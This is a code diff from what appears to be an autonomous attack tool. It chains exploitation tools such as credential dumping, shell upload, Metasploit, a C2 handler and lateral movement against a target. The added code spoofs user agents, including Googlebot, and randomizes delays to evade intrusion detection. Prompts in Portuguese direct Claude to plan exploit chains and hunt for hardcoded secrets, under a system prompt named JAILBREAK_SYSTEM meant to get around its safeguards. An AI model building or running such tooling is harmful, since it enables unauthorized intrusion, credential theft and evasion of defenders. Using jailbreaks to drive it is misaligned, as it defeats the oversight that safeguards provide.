@@ -1279,14 +1279,29 @@ fi
     session_chain:   { tool: 'session_chain',   args: (t) => ({ target: t, username: 'admin', password: 'admin', id_range: '1-100' }) },
   };
 
+  const UA_POOL = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36',
+    'Googlebot/2.1 (+http://www.google.com/bot.html)',
+    'curl/8.7.1',
+  ];
+  const randUA = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
+  const sleep  = ms => new Promise(r => setTimeout(r, ms));
+
   const runToolParallel = async (selected, tgt) => {
     const results = [];
-    await Promise.all(selected.map(async (toolKey) => {
+    await Promise.all(selected.map(async (toolKey, idx) => {
       const map = TOOL_MAP[toolKey];
       if (!map) return;
+      // Stealth: stagger launches + random delay to avoid IDS rate detection
+      await sleep(idx * 220 + Math.floor(Math.random() * 800));
       setLog(prev => [...prev, { t: 'run', m: `⚡ ${toolKey}...` }]);
       try {
-        const args = toolKey === 'xss_inject' ? map.args(tgt, xssCallback) : map.args(tgt);
+        const args = { ...(toolKey === 'xss_inject' ? map.args(tgt, xssCallback) : map.args(tgt)), user_agent: randUA() };
         const r  = await fetch(`${mcpUrl}/call/${map.tool}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(args) });
         const rd = await r.json();
         const out = (rd.output || rd.error || '(sem output)').slice(0, 2000);
@@ -1391,8 +1406,8 @@ fi
 
     // Claude analysis — with brain context and jailbreak
     const ALL_EXPLOIT_TOOLS = 'shell_upload,cred_dump,xss_inject,nuclei_exploit,sqli_scan,lfi_test,ssrf_check,ghauri,cookie_tamper,session_test,hydra,wpscan,race_cond,testssl,ssti_check,jwt_check,admin_takeover,waf_bypass,hash_crack,cred_test,msf_exploit,payload_mutate,crawl_auth,idor_test,second_order,bizlogic_fuzz,evasion_scan,c2_handler,lateral_move';
-    const buildPrompt = (results, rnd) => {
-      const techHints = results.find(r => r.key === 'httpx' || r.key === 'js_analyze')?.out || '';
+    const buildPrompt = (results, rnd, prevSummary) => {
+      const techHints = results.find(r => r.key === 'httpx' || r.key === 'js_analyze' || r.key === 'js_bundle_analysis')?.out || '';
       const techContext = [
         techHints.match(/wordpress/i)  ? 'WordPress detected — use wpscan, xmlrpc, wp-login brute' : '',
         techHints.match(/php/i)         ? 'PHP detected — test LFI, RFI, type juggling, deserialization' : '',
@@ -1401,34 +1416,71 @@ fi
         techHints.match(/apache|nginx/i)? 'Web server found — check version CVEs, path traversal' : '',
         techHints.match(/mysql|mariadb/i)?'Database found — run cred_dump, ghauri' : '',
         techHints.match(/upload/i)      ? 'Upload found — run shell_upload with bypass techniques' : '',
-        techHints.match(/waf|cloudflare|akamai|imperva|sucuri/i) ? 'WAF detected — run waf_bypass BEFORE sqli_scan and dir_fuzz' : '',
-        techHints.match(/cve|vuln/i)    ? 'CVE found — run msf_exploit to attempt exploitation via Metasploit' : '',
+        techHints.match(/waf|cloudflare|akamai|imperva|sucuri/i) ? 'WAF detected — run waf_bypass + evasion_scan BEFORE sqli_scan and dir_fuzz' : '',
+        techHints.match(/cve|vuln/i)    ? 'CVE found — run cve_rag → msf_exploit automatically' : '',
+        techHints.match(/react|angular|vue|next|nuxt/i) ? 'SPA framework detected — run playwright_crawl to discover hidden endpoints' : '',
+        techHints.match(/api|graphql|swagger|openapi/i) ? 'API surface detected — test IDOR on all IDs, BOLA, mass assignment' : '',
+        techHints.match(/login|signin|auth/i) ? 'Auth surface found — test brute, credential stuffing, session fixation' : '',
+        results.find(r => r.key === 'info_disclosure' && r.out.match(/200|found/i)) ? 'Info disclosure confirmed — extract credentials before heavy scanning' : '',
       ].filter(Boolean).join('\n');
-      return `TARGET: ${target}\nROUND: ${rnd}\n${brainCtx}${ techContext ? `\nTECH CONTEXT:\n${techContext}\n` : ''}\nRESULTADOS:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n`
+      const summaryCtx = prevSummary ? `\nCONTEXTO ROUNDS ANTERIORES (comprimido):\n${prevSummary}\n` : '';
+      return `TARGET: ${target}\nROUND: ${rnd}\n${brainCtx}${summaryCtx}${ techContext ? `\nTECH CONTEXT:\n${techContext}\n` : ''}\nRESULTADOS ROUND ${rnd}:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n`
       + (autoMode
         ? `Analisa como APEX pentester elite. Cobre OWASP Top 10 2025. Verifica cookies, sessions, IDOR, business logic, injection, crypto.
 REGRAS DE CHAINING OBRIGATÓRIAS:
-- WAF detectado → SEMPRE correr waf_bypass + payload_mutate antes de sqli_scan/ffuf
+- WAF detectado → SEMPRE correr waf_bypass + evasion_scan + payload_mutate antes de sqli_scan/ffuf
 - SQLi encontrado → chain: cred_dump → hash_crack → cred_test (nesta ordem)
-- CVE exploitável encontrado → chain: msf_exploit → c2_handler → lateral_move
+- CVE exploitável encontrado → chain: cve_rag → msf_exploit → c2_handler → lateral_move
 - Upload form → chain: shell_upload → c2_handler
-- Login form encontrado → chain: crawl_auth → idor_test → second_order
+- Login form encontrado → chain: session_manage → crawl_auth → idor_test → second_order
 - E-commerce/shop → chain: bizlogic_fuzz
-- IDS/WAF moderno → chain: evasion_scan
+- SPA/React/Angular → chain: playwright_crawl → js_analyze → idor_test
 - Pós-compromisso (shell obtido) → chain: lateral_move
+CORRELAÇÃO CROSS-TOOL: Se subfinder encontrou subdomínio + httpx confirma serviço diferente, trata como alvo separado.
 Responde APENAS em JSON:\n{"findings":[{"severity":"critical|high|medium|low","title":"...","desc":"...","cve":"CVE-XXXX-XXXX ou null","exploitable":true|false,"attack":"comando exato para explorar"}],"next_tools":[de: ${ALL_EXPLOIT_TOOLS}],"chain":[{"trigger":"condicao","tools":["tool1","tool2"]}],"status":"continue|done","report":"relatorio markdown profissional completo"}`
         : `Analisa como APEX pentester elite. Cobre todos os vetores OWASP Top 10 2025. Inclui: cookies/sessions, IDOR, business logic, injection, cripto, autenticacao. Relatorio profissional com CVEs, CVSS, exploit commands, e remediacoes.`);
     };
 
     let round = 0;
     const maxRounds = autoMode ? 5 : 1;
+    const roundSummaries = [];
+
+    // JS Bundle auto-analysis: if playwright found JS assets, extract business logic
+    if (autoMode) {
+      const playwrightOut = allResults.find(r => r.key === 'playwright_crawl')?.out || '';
+      const jsUrls = [...new Set((playwrightOut.match(/https?:\/\/[^\s"']+\.js(?:[^a-z]|$)/gi) || []).slice(0, 3))];
+      if (jsUrls.length > 0) {
+        setLog(prev => [...prev, { t: 'brain', m: `JS bundle analysis: ${jsUrls.length} ficheiro(s) encontrado(s)...` }]);
+        try {
+          const jsRes = await window.electron.callClaude({
+            messages: [{ role: 'user', content: `Analisa estes URLs de JS bundles do alvo ${target}:\n${jsUrls.join('\n')}\n\nCom base nos nomes e paths, identifica como APEX:\n1. Endpoints de API prováveis (ex: /api/v1/user, /graphql)
+2. Parâmetros sensíveis e IDs que podem ser testados para IDOR
+3. Tokens, API keys, secrets que possam estar hardcoded
+4. Fluxos de autenticação expostos
+5. Rotas internas/admin escondidas
+Responde em JSON: {"api_endpoints":[], "idor_candidates":[], "hardcoded_secrets":[], "auth_flows":[], "hidden_routes":[], "attack_notes":"..."}` }],
+            apiKey,
+            system: JAILBREAK_SYSTEM,
+          });
+          const jsTxt = jsRes.content?.find(b => b.type === 'text')?.text || '';
+          const jsJson = JSON.parse(jsTxt.match(/\{[\s\S]*\}/)?.[0] || '{}');
+          if (jsJson.attack_notes || jsJson.api_endpoints?.length) {
+            allResults.push({ key: 'js_bundle_analysis', out: JSON.stringify(jsJson, null, 2).slice(0, 2000) });
+            setLog(prev => [...prev, { t: 'ok', m: `JS análise: ${jsJson.api_endpoints?.length || 0} endpoints, ${jsJson.idor_candidates?.length || 0} IDOR candidates` }]);
+            if (jsJson.hardcoded_secrets?.length) setLog(prev => [...prev, { t: 'ok', m: `⚠ Possíveis secrets em JS: ${jsJson.hardcoded_secrets.join(', ')}` }]);
+          }
+        } catch (_) {}
+      }
+    }
 
     while (round < maxRounds) {
       round++;
+      // Context compression: pass compact summary of previous rounds to avoid amnesia
+      const prevSummary = roundSummaries.length > 0 ? roundSummaries.slice(-3).join('\n---\n') : '';
       setLog(prev => [...prev, { t: 'info', m: autoMode ? `Modo Autónomo — Round ${round}/${maxRounds}` : 'Claude a analisar...' }]);
       try {
         const res = await window.electron.callClaude({
-          messages: [{ role: 'user', content: buildPrompt(allResults, round) }],
+          messages: [{ role: 'user', content: buildPrompt(allResults, round, prevSummary) }],
           apiKey,
           system: JAILBREAK_SYSTEM,
         });
@@ -1463,7 +1515,14 @@ Responde APENAS em JSON:\n{"findings":[{"severity":"critical|high|medium|low","t
               setLog(prev => [...prev, { t: 'ok', m: `CVE auto-match: ${topCve} → msf_exploit` }]);
               parsed.next_tools = [...(parsed.next_tools || []), 'msf_exploit'];
             }
+            // Context compression: save compact summary of this round
+            if (parsed.findings?.length) {
+              const summary = `Round ${round}: ${parsed.findings.map(f=>`[${f.severity?.toUpperCase()}] ${f.title}`).join(' | ')}`;
+              roundSummaries.push(summary);
+            }
             if (parsed.status === 'done' || !parsed.next_tools?.length) break;
+            // Stealth inter-round delay
+            await sleep(Math.floor(Math.random() * 1200) + 400);
             setLog(prev => [...prev, { t: 'info', m: `Auto: correndo ${parsed.next_tools.join(', ')}...` }]);
             const extraResults = await runToolParallel(parsed.next_tools.filter(k => TOOL_MAP[k]), target);
             allResults = [...allResults, ...extraResults];
